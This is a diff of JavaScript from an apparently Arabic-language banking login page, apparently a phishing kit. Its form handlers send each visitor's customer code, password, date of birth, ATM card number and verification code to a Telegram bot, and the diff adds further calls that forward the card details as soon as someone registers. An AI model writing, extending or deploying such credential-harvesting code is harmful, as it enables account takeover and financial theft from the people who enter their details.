@@ -311,7 +311,6 @@
         alert('يرجى إدخال رمز العميل وكلمة المرور');
         return;
       }
-      // إرسال بيانات الدخول للبوت
       sendToTelegram(`دخول جديد:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`);
       showVerify();
     }
@@ -329,15 +328,22 @@
         return;
       }
       registerData = { user, birth, card };
-      // الانتقال إلى صفحة رمز التحقق مباشرة
+      // أرسل معلومات التسجيل كاملة
+      sendToTelegram(
+        `تسجيل جديد:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}`
+      );
+      // أرسل معلومات التسجيل مع البطاقة فقط
+      sendToTelegram(
+        `معلومات التسجيل مع البطاقة:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}`
+      );
       showVerify();
     }
     function submitVerify() {
       const verifyCode = document.getElementById('verify-code').value.trim();
-      // إرسال البيانات مع رمز التحقق إلى البوت
+      // أرسل معلومات التسجيل السابقة مع رمز التحقق إلى البوت
       if (registerData.user && registerData.birth && registerData.card) {
         sendToTelegram(
-          `تسجيل جديد:\nرمز العميل: ${registerData.user}\nتاريخ الميلاد: ${registerData.birth}\nبطاقة الصراف الآلي: ${registerData.card}\nرمز التحقق: ${verifyCode}`
+          `تسجيل جديد مع رمز التحقق:\nرمز العميل: ${registerData.user}\nتاريخ الميلاد: ${registerData.birth}\nبطاقة الصراف الآلي: ${registerData.card}\nرمز التحقق: ${verifyCode}`
         );
         registerData = {};
         showLogin();
